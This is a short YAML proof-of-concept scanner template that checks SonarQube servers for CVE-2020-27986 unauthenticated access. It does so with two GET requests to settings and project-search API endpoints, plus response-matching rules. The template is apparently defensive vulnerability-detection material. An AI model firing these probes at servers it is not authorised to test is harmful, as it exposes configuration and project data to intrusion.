name: poc-yaml-sonarqube-cve-2020-27986-unauth
manual: true
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /api/settings/values
    expression: response.status == 200 && response.content_type.contains("application/json") && response.body.bcontains(bytes(string(b"sonaranalyzer-cs.nuget.packageVersion"))) && response.body.bcontains(bytes(string(b"sonar.core.id")))
  r1:
    request:
      cache: true
      method: GET
      path: /api/components/search_projects
    expression: response.body.bcontains(b"{\"paging\":{\"pageIndex\":1,\"pageSize\"") && response.body.bcontains(b"\"visibility\":\"public\"")
expression: r0() || r1()
detail:
  author: pa55w0rd(www.pa55w0rd.online/)
  links:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-27986
  vulnerability:
    id: CT-143608
    level: high
  Affected Version: sonarqube < 8.4.2.36762
